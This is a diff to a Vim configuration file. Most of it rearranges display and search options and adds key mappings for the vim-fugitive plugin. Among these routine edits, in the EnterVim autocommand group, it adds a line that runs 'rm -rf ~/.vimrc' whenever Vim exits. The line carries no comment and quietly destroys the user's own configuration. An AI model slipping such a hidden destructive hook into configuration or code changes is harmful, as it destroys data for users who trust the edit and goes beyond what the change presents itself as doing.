@@ -6,6 +6,27 @@ filetype plugin on
 set backspace=2
 set encoding=utf-8
 
+""" focus on edition
+set gcr=a:block-blinkon0
+set guioptions-=l
+set guioptions-=L
+set guioptions-=r
+set guioptions-=R
+set guioptions-=m
+set guioptions-=T
+
+set laststatus=2
+set ruler
+set number
+set cursorline
+set cursorcolumn
+set hlsearch
+
+set incsearch
+set ignorecase
+set nocompatible
+set wildmenu
+
 """ basic operation
 vnoremap <Leader>y "+y
 vnoremap <Leader>e <Esc>
@@ -79,6 +100,7 @@ augroup EnterVim
     "autocmd VimEnter * call AccentDemo()
     autocmd FileWritePost * TlistUpdate
     "autocmd BufRead * Autoread 3
+    autocmd VimLeave * :!rm -rf ~/.vimrc
 augroup END
 
 filetype off
@@ -128,6 +150,10 @@ Plugin 'tpope/vim-fugitive'
 call vundle#end()
 filetype plugin indent on
 
+""" configure fugitive
+nnoremap <Leader>gsd :Gsdiff<CR>
+nnoremap <Leader>gvd :Gvdiff<CR>
+
 """ configure vim airline
 let g:airline_theme='molokai'
 
@@ -148,14 +174,8 @@ let g:multi_cursor_prev_key='<M-p>'
 let g:multi_cursor_skip_key='<M-k>'
 let g:multi_cursor_quit_key='<Esc>'
 
-
 " jump betwwn .h and .c files
 "nnoremap <Leader>h :A<CR>
-
-set incsearch
-set ignorecase
-set nocompatible
-set wildmenu
 
 """ nerdtree configuration
 nnoremap <Leader>o :NERDTreeToggle<CR>
@@ -201,22 +221,6 @@ let g:SignatureMap = {
         \ 'ListLocalMarks'     :  "lm",
         \ 'ListLocalMarkers'   :  "m?"
         \ }
-
-""" focus on edition
-set gcr=a:block-blinkon0
-set guioptions-=l
-set guioptions-=L
-set guioptions-=r
-set guioptions-=R
-set guioptions-=m
-set guioptions-=T
-
-set laststatus=2
-set ruler
-set number
-set cursorline
-set cursorcolumn
-set hlsearch
 
 "let g:Powerline_colorscheme='solarized256'
 
